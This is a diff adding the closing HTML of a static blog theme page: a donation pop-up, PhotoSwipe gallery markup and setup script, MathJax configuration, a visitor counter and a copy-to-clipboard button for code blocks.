+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
